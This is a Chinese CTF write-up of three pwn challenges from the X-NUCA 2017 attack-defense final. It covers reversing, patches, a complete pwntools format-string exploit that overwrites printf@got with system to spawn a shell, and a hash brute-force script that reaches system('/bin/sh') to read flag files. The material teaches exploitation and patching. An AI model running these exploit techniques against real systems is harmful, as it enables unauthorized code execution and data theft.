# X-NUCA 2017 FINAL 攻防模式 PWN 总结
X-NUCA线下决赛团体赛为渗透+攻防的模式，攻防模式一共有5台gamebox，2个web、3个pwn，在20号下午6点第一阶段的渗透模式结束后，主办方在微信群里上传了攻防模式的3道pwn题文件，我们吃完饭后抓紧时间赶回到酒店，开始逆向这3道题。

这次的3道pwn题和之前所做过的pwn题相比，代码量都多了不少，而且许多地方都存在着递归嵌套，漏洞点也不止一个，逆向起来需要很好的耐心和敏锐的观察力，接下来一一分析这3道题:
## calc
```plain
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x400000)
```
这道题实现了一个简单的计算器，输入中缀算术表达式，输出计算结果，支持的合法字符有"0123456789+-*/()"。程序接收表示达输入后，开始遍历表达式并递归构造二叉语法树，如下图所示：
```plain
 表达式：10+2*(3-4)-5/6
 语法树：
           -
        /     \
       +       /
     /   \    /  \
    10    *  5    6
         /  \
        2    -
           /   \
          3     4
```
语法树的非叶节点为运算符，叶节点为数字。我在这道题上发现的漏洞全都集中在递归构造语法树的那部分代码上。
### 堆溢出
为了得到一个完整的节点值，在扫描表达式的过程中，程序使用ptr来存储扫描的中间结果，ptr是一块分配自堆的大小为0x20的缓冲区。当扫描到数字或者非法字符时，程序会往ptr上复制字符并循环此行为，直到扫描到一个不同类型的字符为止(数字与运算符、非法字符不同类型，非法字符与合法字符不用类型)，详见下图代码：
```c
char *sub_40095A()
{
  v17 = ptr;
  if ( !element ){
    v0 = (char *)expr++;
    element = *v0;
  }
  while ( element == ' ' ){//忽略空格
    v1 = (char *)expr++;
    element = *v1;
  }
  if ( element == '\n' ){//空格后如果为\n，则ptr="<EOL>"
    ......//省略部分代码
    element = 0;
    value = 0;
  }
  else if ( element <= 0x2F || element > 0x39 ){
    switch ( element ){//非数字字符
      case '+':
        v17 = ptr + 1;
        *ptr = element;
        v8 = (char *)expr++;
        element = *v8;
        value = 2;
        break;
      case '-':
        ......//省略部分代码，与case '+'类似
        value = 3;
        break;
      case '*':
        ......
        value = 4;
        break;
      case '/':
        ......
        value = 5;
        break;
      case '(':
	    ......
        value = 6;
        break;
      case ')':
        ......
        value = 7;
        break;
      default://将非法字符复制到ptr上
        while ( element != '\n' ){
          v14 = v17++;
          *v14 = element;
          v15 = (char *)expr++;
          element = *v15;
        }
        element = 0;
        value = -1;
        break;
    }
  }
  else{
    while ( element > 0x2F && element <= 0x39 ){//将数字复制到ptr上
      v6 = v17++;
      *v6 = element;
      v7 = (char *)expr++;
      element = *v7;
    }
    value = 1;
  }
  result = v17;
  *v17 = 0;
  return result;
}
```
往ptr上连续复制数字或者非法字符的过程并没有对复制的最大长度做出限制，所以可以通过输入大量连续的数字或非法字符来造成堆溢出。
#### 漏洞利用
对于如何通过这个漏洞来获取shell，我并没有想出一个完整的利用过程，赛后在微信群问了下，有师傅表示可以利用这个堆溢出做unlink，最后用onegadget来get shell，不过没有拿到他们的exp。
#### patch方案
修复这个漏洞的思路有两种，一是对复制的最大长度做出限制，二是增大ptr缓冲区的长度。第一种思路要求在原先循环部分的汇编代码上新增对复制长度的统计和判断，实现起来比较困难。第二种思路直接修改malloc函数的参数就可以达到目的，比较简单，最终我们选择第二种思路来完成漏洞修补：

patch前：
```x86asm
sub     rsp, 10h
mov     edi, 20h 
call    _malloc
mov     cs:ptr, rax
```
patch后：
```x86asm
sub     rsp, 10h
mov     edi, 200h 
call    _malloc
mov     cs:ptr, rax
```
完成patch后，ptr缓冲区变大，可以有效的缓解堆溢出漏洞，虽然没有从根本上解决堆溢出问题，但其他队伍在拿不到patch后文件的情况下，很难再次利用此漏洞来获取shell。

### 格式化字符串漏洞
当程序扫描到左括号"("时，会继续递归构造语法树，如果递归的出口不是右括号")"时，括号的闭合检查失败，程序会打印错误的输入：
```c
_DWORD *sub_400E84()
{
  sub_40095A();
  v1 = sub_4010E5();//递归部分
  if ( v1 ){
    if ( value == 7 ){//右括号对应的符号值
      sub_40095A();
      result = v1;
    }
    else{
      puts("Expecting )");
      printf(ptr);//打印错误的输入
      sub_400D64(v1);
      result = 0LL;
    }
  }
  else
    result = 0LL;
  return result;
}
```
观察上面的代码可以看出，打印错误输入的代码printf(ptr)存在格式化字符串漏洞，通过构造一些错误的表达式，可以触发漏洞代码被执行：
```plain
lwh@ubuntu:~/Desktop$ ./calc 
Simple Integer Arithmetic Calculator
Valid chars: 0123456789+-*/()
Enter "exit" to quit
>(2a)  
Expecting )
a)>
```
在非法表达式(2a)中，a)被当成了错误部分输出。
#### 漏洞利用
##### 1.leak libc
拿到格式化字符串漏洞后第一时间的想法就是可以利用这个漏洞来泄露一些信息，在这里，通过如下操作可以泄露libc上 _IO_2_1_stdin_的地址：
```plain
lwh@ubuntu:~/Desktop$ ./calc 
Simple Integer Arithmetic Calculator
Valid chars: 0123456789+-*/()
Enter "exit" to quit
>1
1
>((1%6$p)   //在x86_64下，%6$p会打印栈顶数据
Expecting )
0x7fdcea2518e0)>
```
```plain
[----------------------------------registers-----------------------------------]
RAX: 0x25ab010 --> 0x2970243625 ('%6$p)')
RDI: 0x25ab010 --> 0x2970243625 ('%6$p)')
RSP: 0x7ffcd17eade0 --> 0x7fdcea2518e0 --> 0xfbad208b 
RIP: 0x400ed1 (mov    eax,0x0)
[-------------------------------------code-------------------------------------]
   0x400ec7:	mov    rax,QWORD PTR [rip+0x2015d2]        # 0x6024a0
   0x400ece:	mov    rdi,rax
=> 0x400ed1:	mov    eax,0x0
   0x400ed6:	call   0x4006a0 <printf@plt>
   0x400edb:	mov    rax,QWORD PTR [rbp-0x8]
[------------------------------------stack-------------------------------------]
0000| 0x7ffcd17eade0 --> 0x7fdcea2518e0  <-- %6$p
0008| 0x7ffcd17eade8 --> 0x25ab040
0016| 0x7ffcd17eadf0 --> 0x7ffcd17eae10
0024| 0x7ffcd17eadf8 --> 0x400f57
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Breakpoint 1, 0x0000000000400ed1 in ?? ()
gdb-peda$ x 0x7fdcea2518e0
   0x7fdcea2518e0 <_IO_2_1_stdin_>:	mov    esp,DWORD PTR [rax]
```
##### 2.利用格式化漏洞来实现任意地址写
由于用来存放错误字符串的ptr位于堆上，所以不能随心所欲地在栈上布置指针来实现任意地址写，那么该如何任意写目标呢？在这里我们需要利用ebp作为跳板，在栈上构造出指向任意地址的指针来完成任意地址写。看到这里，相信学习过队内二进制渗透教程第三章的人对这个套路都会有一些印象，教程中就举了一个利用ebp来完成格式化字符串攻击的例子。不过在这里，需要对ebp做更进一步利用。当输入一个简单的错误表达式触发存在格式化字符串漏洞代码时，当前栈结构如下：
```plain
Breakpoint 1, 0x0000000000400ed1 in ?? ()
gdb-peda$ stack 25
0000| 0x7ffc9203eea0 -->                 <-- %6$
0008| 0x7ffc9203eea8 --> 
0016| 0x7ffc9203eeb0 --> 0x7ffc9203eed0  <-- sub_400E84's ebp %8$
0024| 0x7ffc9203eeb8 --> 0x400f57        <-- sub_400E84's ret addr 
0032| 0x7ffc9203eec0 --> 
0040| 0x7ffc9203eec8 --> 
0048| 0x7ffc9203eed0 --> 0x7ffc9203eef0  <-- sub_400EFE's ebp %12$
0056| 0x7ffc9203eed8 --> 0x4010f7        <-- sub_400EFE's ret addr
0064| 0x7ffc9203eee0 --> 
0072| 0x7ffc9203eee8 --> 
0080| 0x7ffc9203eef0 --> 0x7ffc9203ef10  <-- sub_4010E5's ebp %16$
0088| 0x7ffc9203eef8 --> 0x40117c        <-- sub_4010E5's ret addr
0096| 0x7ffc9203ef00 --> 
0104| 0x7ffc9203ef08 --> 
0112| 0x7ffc9203ef10 --> 0x7ffc9203ef30  <-- sub_40114F's ebp %20$
0120| 0x7ffc9203ef18 --> 0x400841        <-- sub_40114F's ret addr
0128| 0x7ffc9203ef20 --> 
0136| 0x7ffc9203ef28 --> 
0144| 0x7ffc9203ef30 --> 0x7ffc9203ef40  <-- sub_400806's ebp %24$
0152| 0x7ffc9203ef38 --> 0x4008e9        <-- sub_400806's ret addr
0160| 0x7ffc9203ef40 --> 0x4011d0        <-- main's ebp       %26$
0168| 0x7ffc9203ef48 --> 0x7fbabe52e830  <-- main's ret addr
gdb-peda$ 
```
在这里，我选用了函数sub_40114F的ebp作为第一层跳板来修改函数sub_400806的ebp值，让其指向栈上某个空闲的位置，然后再利用函数sub_400806的ebp作为第二次跳板向其指向的空闲位置写入指向printf@got的指针，最后用栈上指向printf@got的指针作为第三层跳板，覆盖printf@got的值为system的地址。整个格式化写过程使用%$hhn来完成，所以需要输入大量错误表达式来完成格式化写操作。完成第三层跳板的构造后，当前栈结构如下：
```plain
Breakpoint 1, 0x0000000000400edb in ?? ()
gdb-peda$ stack 30
......
......
0112| 0x7fffe5936150 --> 0x7fffe5936170 <-- sub_40114F's ebp
0120| 0x7fffe5936158 --> 
0128| 0x7fffe5936160 --> 
0136| 0x7fffe5936168 --> 
0144| 0x7fffe5936170 --> 0x7fffe59361aa <-- sub_400806's ebp
0152| 0x7fffe5936178 --> 
0160| 0x7fffe5936180 --> 0x602038 <-- printf@got      %26$hhn
0168| 0x7fffe5936188 --> 0x602039 <-- printf@got + 1  %27$hhn
0176| 0x7fffe5936190 --> 0x60203a <-- printf@got + 2  %28$hhn
0184| 0x7fffe5936198 --> 0x60203b <-- printf@got + 3  %29$hhn
0192| 0x7fffe59361a0 --> 0x60203c <-- printf@got + 4  %30$hhn
0200| 0x7fffe59361a8 --> 0x60203d <-- printf@got + 5  %31$hhn
0208| 0x7fffe59361b0 -->
......
......
gdb-peda$ 
```
将printf@got覆盖为system地址后，只需输入合适的错误表达式来触发漏洞就可以get shell，比如表达式(1sh;)，最后附上完整exp:
```python
from pwn import *

stdin_so = 0x00000000003C48E0
printf_got = 0x000000602038
system_so = 0x0000000000045390
target = 0x000000602038
ebp4 = 0
def pwn(ip):
    #p = remote(ip,1082)
    global ebp4
    p = process("./calc") 
    p.recvuntil(">")
    p.sendline("(1%6$p)")
    p.recvuntil(">")
    p.sendline("((1%6$p)")
    p.recvuntil("Expecting )\n")
    stdin = int(p.recv(14),16)
    libc_base = stdin - stdin_so
    system = libc_base + system_so
    p.recvuntil(">")
    p.sendline("(1%8$p)")
    p.recvuntil("Expecting )\n")
    stack = int(p.recv(14),16)
    ebp4 = stack + 0x70 #%24$p
    
    step1(p)
    step2(p)
    step3(p)
    step4(p)
    step5(p)
    step6(p)
    
    byte1 = system & 0xff
    byte2 = (system>>8) & 0xff
    byte3 = (system>>16) & 0xff
    byte4 = (system>>24) & 0xff
    byte5 = (system>>32) & 0xff
    byte6 = (system>>40) & 0xff

    payload = "(1%" + str(byte1) + "c%26$hhn"
    if byte2 > byte1:
        payload += "%" + str(byte2 - byte1) + "c%27$hhn"
    else:
        payload += "%" + str(0x100 + byte2 - byte1) + "c%27$hhn"

    if byte3 > byte2:
        payload += "%" + str(byte3 - byte2) + "c%28$hhn"
    else:
        payload += "%" + str(0x100 + byte3 - byte2) + "c%28$hhn"

    if byte4 > byte3:
        payload += "%" + str(byte4 - byte3) + "c%29$hhn"
    else:
        payload += "%" + str(0x100 + byte4 - byte3) + "c%29$hhn"

    if byte5 > byte4:
        payload += "%" + str(byte5 - byte4) + "c%30$hhn"
    else:
        payload += "%" + str(0x100 + byte5 - byte4) + "c%30$hhn"

    if byte6 > byte5:
        payload += "%" + str(byte6 - byte5) + "c%31$hhn"
    else:
        payload += "%" + str(0x100 + byte6 - byte5) + "c%31$hhn"
payload += ")"

    p.sendline(payload)
    p.sendline("(1cat /opt/xnuca/flag.txt;)")
    p.recvuntil("gongfang")
    flag = p.recvline()
    flag = flag.replace("}","").replace("{","")
    print flag
    return flag

def step1(p):
    word1 = target & 0xff
    payload = "(1%" + str(word1) + "c%24$hhn)"
    p.sendline(payload)

    word1 = (ebp4 & 0xff) + 1
    payload = "(1%" + str(word1) + "c%20$hhn)"
    p.sendline(payload)

    word1 = (target >> 8) & 0xff
    payload = "(1%" + str(word1) + "c%24$hhn)"
    p.sendline(payload)

    word1 = (ebp4 & 0xff) + 2
    payload = "(1%" + str(word1) + "c%20$hhn)"
    p.sendline(payload)

    word1 = (target >> 16) & 0xff
    payload = "(1%" + str(word1) + "c%24$hhn)"
    p.sendline(payload)
    
def step2(p):
    word1 = (ebp4 & 0xff) + 8
    payload = "(1%" + str(word1) + "c%20$hhn)"
    p.sendline(payload)

    word1 = (target & 0xff) + 1
    payload = "(1%" + str(word1) + "c%24$hhn)"
    p.sendline(payload)

    word1 = (ebp4 & 0xff) + 1 + 8
    payload = "(1%" + str(word1) + "c%20$hhn)"
    p.sendline(payload)

    word1 = (target >> 8) & 0xff
    payload = "(1%" + str(word1) + "c%24$hhn)"
    p.sendline(payload)

    word1 = (ebp4 & 0xff) + 2 + 8
    payload = "(1%" + str(word1) + "c%20$hhn)"
    p.sendline(payload)

    word1 = (target >> 16) & 0xff
    payload = "(1%" + str(word1) + "c%24$n)"
    p.sendline(payload)

def step3(p):
    word1 = (ebp4 & 0xff) + 0x10
    payload = "(1%" + str(word1) + "c%20$hhn)"
    p.sendline(payload)

    word1 = (target & 0xff) + 2
    payload = "(1%" + str(word1) + "c%24$hhn)"
    p.sendline(payload)

    word1 = (ebp4 & 0xff) + 1 + 0x10
    payload = "(1%" + str(word1) + "c%20$hhn)"
    p.sendline(payload)

    word1 = (target >> 8) & 0xff
    payload = "(1%" + str(word1) + "c%24$hhn)"
    p.sendline(payload)

    word1 = (ebp4 & 0xff) + 2 + 0x10
    payload = "(1%" + str(word1) + "c%20$hhn)"
    p.sendline(payload)
    
    word1 = (target >> 16) & 0xff
    payload = "(1%" + str(word1) + "c%24$n)"
    p.sendline(payload)

def step4(p):
    word1 = (ebp4 & 0xff) + 0x18
    payload = "(1%" + str(word1) + "c%20$hhn)"
    p.sendline(payload)

    word1 = (target & 0xff) + 3
    payload = "(1%" + str(word1) + "c%24$hhn)"
    p.sendline(payload)

    word1 = (ebp4 & 0xff) + 1 + 0x18
    payload = "(1%" + str(word1) + "c%20$hhn)"
    p.sendline(payload)

    word1 = (target >> 8) & 0xff
    payload = "(1%" + str(word1) + "c%24$hhn)"
    p.sendline(payload)

    word1 = (ebp4 & 0xff) + 2 + 0x18
    payload = "(1%" + str(word1) + "c%20$hhn)"
    p.sendline(payload)
    
    word1 = (target >> 16) & 0xff
    payload = "(1%" + str(word1) + "c%24$n)"
    p.sendline(payload)

def step5(p):
    word1 = (ebp4 & 0xff) + 0x20
    payload = "(1%" + str(word1) + "c%20$hhn)"
    p.sendline(payload)

    word1 = (target & 0xff) + 4
    payload = "(1%" + str(word1) + "c%24$hhn)"
    p.sendline(payload)

    word1 = (ebp4 & 0xff) + 1 + 0x20
    payload = "(1%" + str(word1) + "c%20$hhn)"
    p.sendline(payload)

    word1 = (target >> 8) & 0xff
    payload = "(1%" + str(word1) + "c%24$hhn)"
    p.sendline(payload)

    word1 = (ebp4 & 0xff) + 2 + 0x20
    payload = "(1%" + str(word1) + "c%20$hhn)"
    p.sendline(payload)

    word1 = (target >> 16) & 0xff
    payload = "(1%" + str(word1) + "c%24$n)"
    p.sendline(payload)

def step6(p):
    word1 = (ebp4 & 0xff) + 0x28
    payload = "(1%" + str(word1) + "c%20$hhn)"
    p.sendline(payload)

    word1 = (target & 0xff) + 5
    payload = "(1%" + str(word1) + "c%24$hhn)"
    p.sendline(payload)

    word1 = (ebp4 & 0xff) + 1 + 0x28
    payload = "(1%" + str(word1) + "c%20$hhn)"
    p.sendline(payload)

    word1 = (target >> 8) & 0xff
    payload = "(1%" + str(word1) + "c%24$hhn)"
    p.sendline(payload)

    word1 = (ebp4 & 0xff) + 2 + 0x28
    payload = "(1%" + str(word1) + "c%20$hhn)"
    p.sendline(payload)
    word1 = (target >> 16) & 0xff
    payload = "(1%" + str(word1) + "c%24$n)"
    p.sendline(payload) 

pwn("ip")
```
#### patch方案
将printf替换puts可以修复此漏洞，使用IDA插件Keypatch可以直接完成汇编层面的修改

patch前：
```x86asm
.text:0000000000400EC7 48 8B 05 D2 15 20 00   mov     rax, cs:ptr
.text:0000000000400ECE 48 89 C7               mov     rdi, rax
.text:0000000000400ED1 B8 00 00 00 00         mov     eax, 0
.text:0000000000400ED6 E8 C5 F7 FF FF         call    _printf
.text:0000000000400EDB 48 8B 45 F8            mov     rax, [rbp+var_8]
```
patch后：
```x86asm
.text:0000000000400EC7 48 8B 05 D2 15 20 00   mov     rax, cs:ptr
.text:0000000000400ECE 48 89 C7               mov     rdi, rax  
.text:0000000000400ED1 B8 00 00 00 00         mov     eax, 0
.text:0000000000400ED6 E8 B5 F7 FF FF         call    _puts
.text:0000000000400EDB 48 8B 45 F8            mov     rax, [rbp+var_8]
```
### 小结
20号晚上，我们发现了上述两个漏洞并完成了修补，第二天比赛开始后，第一时间上传了patch后的文件，之后这道题就守住了，没有被攻破。比较遗憾的是，我一直到21号下午2点左右才完成了格式化字符串漏洞的利用，接着开始尝试打全场，这时只剩6个队还没有对漏洞做出修补，可以获得flag，到21号下午6点比赛结束，我们利用这个漏洞拿到了600多分，如果能够早点写出exp，应该可以收割更多的flag，有点可惜。
## fileparser
程序主体是一个递归XMF文件解析器，在程序的开头，出题人留下了一个后门：
```c
__int64 sub_40126E()
{
  v7 = *MK_FP(__FS__, 40LL);
  v2 = 0LL;
  v1 = &unk_6020E0;
  v3 = 0x2000LL;
  memset(&s, 0, 0x98uLL);
  sigemptyset((sigset_t *)&v5);
  s = sub_4011FA;
  v6 = 0x8000000;
  sigaltstack((const struct sigaltstack *)&v1, 0LL);
  sigfillset((sigset_t *)&v5);
  sigaction(11, (const struct sigaction *)&s, 0LL);
  sigaction(7, (const struct sigaction *)&s, 0LL);
  return *MK_FP(__FS__, 40LL) ^ v7;
}
```
```c
void __noreturn sub_4011FA()
{
  v2 = *MK_FP(__FS__, 40LL);
  v0 = fopen("/opt/xnuca/flag.txt", "r");
  __isoc99_fscanf(v0, "%s", &s);
  puts(&s);
  free(ptr);
  exit(0);
}
```
出题人使用函数sigaction()为signum为7和11的信号设置了信号处理函数sub_4011FA()，函数sub_4011FA()会读取flag并打印。通过搜索发现这两个信号分别为SIGBUS和SIGSEGV ，都是和内存访问错误相关的信号。到这里我们就对这个后门有了个明确认识，程序存在漏洞导致进程运行时出现内存错误访问使得内核向进程发出信号SIGBUS或SIGSEGV ，设置好的信号处理函数被调用最后打印flag。

在patch程序的时候，因为和7feilee沟通失误，7feilee修改的是硬编码字符串"/opt/xnuca/flag.txt"，第二天开赛后上传patch过的程序到gamebox上，被checker检测出服务异常，看来checker对这样的敏感字符串也做了检查。发现问题后有赶紧将字符串修改回去，然后对sigaction所针对的信号做了修改，重新上传，在修改期间这道题因为服务异常被扣了一些分，不过完成新的patch后，这道题就没有再因为被攻破和异常掉分。我们没有在这道题上实现漏洞利用，赛后有师傅表示可以通过递归爆栈来触发信号处理函数拿flag。

## csgd
程序在开始时会读取flag，然后用sha3算法对flag做哈希，将哈希值存放在全局变量上：
```c
void *sub_401FB3()
{
  stream = fopen("/opt/xnuca/flag.txt", "rb");
  if ( !stream )
    exit(1);
  v2 = &unk_6072C0;
  memset(&unk_6072C0, 0, 0x41uLL);
  fread(&unk_607280, 0x20uLL, 1uLL, stream);
  byte_6072A0 = 0;
  sub_402F4A(&v1, 32LL);//sha3算法函数
  sub_403C40(&v1, &unk_607280, 32LL);//sha3算法函数
  sub_403DD8(&v1, &unk_6072C0);//sha3算法函数 unk_6072C0为存放hash值的全局变量
  return memset(&unk_607280, 0, 0x20uLL);//对flag清0
}
```
程序提供一个比较哈希值功能，如果哈希值相等，会执行system("/bin/sh")
```c
int sub_401027()
{
  char buf; // [sp+1D0h] [bp-80h]@4
  int v4; // [sp+1D4h] [bp-7Ch]@5
 
  while ( 1 )
  {
    printf("# ");
    input((__int64)&s1, 0x20u, 10);
    if ( !strcmp(&s1, "rename") )
    {
      read(0, ::buf, nbytes);
      puts("successfully reset the username");
    }
    if ( !strcmp(&s1, "opmode") )
    {
      write(1, &unk_6072C0, 0x20uLL);
      v8 = read(0, &buf, 0x24uLL);
      v7 = *(_DWORD *)&buf;
      result = buf & 3;
      if ( buf & 3 )
        return result;
      v6 = &v4;
      sub_402F4A(&v2, &buf);
      sub_403C40(&v2, v6, v7);
      sub_403DD8(&v2, &v1);
      if ( !memcmp(&v1, &unk_6072C0, v7 - 1) )
        system("/bin/sh");
    }
    result = strcmp(&s1, "exit");
    if ( !result )
      break;
    memset(&s1, 0, 0x40uLL);
  }
  return result;
```
输入opmode后，程序会打印flag的哈希值，然后输入一个最大长度为0x24字节的字符串，字符串的前四字节为一个整数，值必须为4的倍数，程序根据整数值取4字节后对应长度的字符串做sha3的哈希，用memcmp比较字符串的hash值和flag的哈希值，比较长度为整数值减1。memcmp比较的字节数最低我们可以控制为3，然后根据程序输出的flag哈希值在本地穷举计算前3字节哈希值和它相等的4字节字符串来通过比较。3字节哈希值的所有组合数为2^8 * 2^8 * 2^8 = 2^24，理论上穷举这么多次就一定可以拿到一个字符串来通过校验，当然这是在考虑哈希值不重复的情况下。7feilee实现了穷举的脚本，在测试的过程中，大概平均1分多钟可以穷举出一个正确值：
```python
from pwn import *
import sys
import hashlib
import sha3
import binascii

p=remote(sys.argv[1],1802)
#p=process("./csgd")
for i in range(0,69):
  print p.recvline(timeout=0.1)
print p.recv(2)
sleep(0.1)
p.send("yy\n")
sleep(0.1)
p.send("yy\n")
sleep(0.1)
p.send("~\n")
sleep(0.1)
p.send("opmode\n")
print "hlep"

for i in range(20):
  txt=p.recv(2,timeout=0.1)
  if txt=="# ":
    txt=p.recv(3,timeout=0.1)
    break
print txt
for i in range(256):
  for j in range(256):
    for z in range(256):
      for k in range(256):
        s=hashlib.sha3_256()
        s.update(chr(i)+chr(j)+chr(z)+chr(k))
        if s.hexdigest()[:6]==binascii.hexlify(txt)[:6]:
          print "OK"
          p.sendline(p32(4)+chr(i)+chr(j)+chr(z)+chr(k))
          p.sendline("cat /opt/xnuca/flag.txt")
          for i in range(0,20):
            print p.recvline(timeout=0.1)
```
虽然我们实现了爆破的脚本，但是因为网络配置和队员间沟通的问题，这个脚本直到20号下午4点多才发挥出功效，那时所有能被打的队伍这道题的分都已经丢光了QAQ

我们采用的patch方案是将system替换成puts，不能修改"/bin/sh"，会被checker检测出服务异常，也不能修改像"opmode"这样的字符串使得这个功能失效，同样会被checker检测出服务异常。


最后分析一下这个程序一个有点隐蔽的栈溢出漏洞，我在比赛期间没有发现这个漏洞，这道题也因为这个漏洞被打穿了。在被打穿的过程中，我们曾对这个程序进行过一顿胡乱的patch，但是都没有patch到点上，来看看这个漏洞代码是怎样的：
```c
signed __int64 __fastcall sub_401BED(__int64 a1)
{
  signed __int64 result; // rax@2
  char v2[1032]; // [sp+10h] [bp-410h]@7
  unsigned int v3; // [sp+418h] [bp-8h]@1
  int v4; // [sp+41Ch] [bp-4h]@1

  v4 = 1024;
  v3 = 0;
  if ( dword_607610 )
    result = 0LL;
  else
  {
    if ( *(_DWORD *)(a1 + 44) != 0x1337FACE && *(_DWORD *)(a1 + 44) )
      puts("We only provide open-box service to legit white hatter :(");
    else
    {
      dword_607610 = 1;
      ptr = malloc(0x800uLL);
      puts("your lucky string>");
      read(0, ptr, 0x800uLL);
LABEL_6:
      while ( v4 )
      {
        v2[v3] = *((_BYTE *)ptr + v3);
        ++v3;
        --v4;
        switch ( *((_BYTE *)ptr + v3 - 1) + 2 )
        {
          case 99:
            ++*(_DWORD *)(a1 + 44);
            goto LABEL_6;
          case 100:
            *(_DWORD *)(a1 + 44) += 2;
            goto LABEL_6;
          case 101:
            *(_DWORD *)(a1 + 44) += 3;
            goto LABEL_6;
          case 102:
            *(_DWORD *)(a1 + 44) += 4;
            goto LABEL_6;
          case 103:
            *(_DWORD *)(a1 + 44) += 5;
            goto LABEL_6;
          case 104:
            *(_DWORD *)(a1 + 44) += 6;
            goto LABEL_6;
          case 105:
            *(_DWORD *)(a1 + 44) += 7;
            goto LABEL_6;
          case 106:
            *(_DWORD *)(a1 + 44) += 8;
            goto LABEL_6;
          case 107:
            *(_DWORD *)(a1 + 44) += 9;
            goto LABEL_6;
          case 108:
            *(_DWORD *)(a1 + 44) += 10;
            goto LABEL_6;
          case 0:
            *(_DWORD *)(a1 + 44) += *((_BYTE *)ptr + v3++);
            --v4;
            goto LABEL_6;
          case 1:
            puts(">>");
            return 1LL;
          default:
            ++*(_DWORD *)(a1 + 44);
            break;
        }
      }
    }
    if ( ptr )
      free(ptr);
    result = 0LL;
  }
  return result;
}
```
通过几个if判断后,程序malloc一个0x800的堆块，通过read往里读入字符串，然后进入while循环，往栈上一个字节一个字节地拷贝数据。while循环的结束条件为v4=0，v4的初始值为1024，每循环一次减1，所以最多往栈上拷贝1024个字节，而栈上缓冲区也超过了1024字节，看起来似乎不发生栈溢出。

仔细观察while循环里的switch语句，当发生case 0时，v4会多减一次1，那么如果循环到v4等于1时，连续两次减1会让v4变为负数，while循环不会终止，可以继续往栈上复制数据，栈溢出就发生了。在溢出的过程中v4会被覆盖，所以v4可控，循环可以通过溢出在合适的时候结束，有了栈溢出，之后的渗透过程也就轻车熟路了，覆盖返回地址，rop传参，调用system。因为漏洞是比赛结束后才发现的，所以没有复现exp。patch的方法也简单，控制malloc的参数，修改v4等等方法都行。

## 总结
一天半的比赛时间，看着各位师傅大发神威收割flag，再看着自己的题补不上漏洞被打穿，心里无限感慨orz。。。不管是逆向的功底还是漏洞利用的能力都和各位师傅都有不小差距。比赛是20号下午1点开始，而我们早上才赶到深圳，比赛状态一般，还有第一次打pwn这么多的攻防赛，不论是从题的数目还是从每道题的代码量上都很多，逆向分析的压力不小。最后就是在比赛的过程中，团队的沟通不够充分，对于网络拓扑信息的理解没有及时分享，从爆破hash的脚本早早写好，但因为网络没有配置好一直打不出去就可以看出来。毕竟是第一次和队内各位大佬一起打线下攻防赛，还有待磨合和提高，成绩不好也在接受范围之内，总的来说，能提高的地方还有很多，期待下一次的高质量攻防赛。

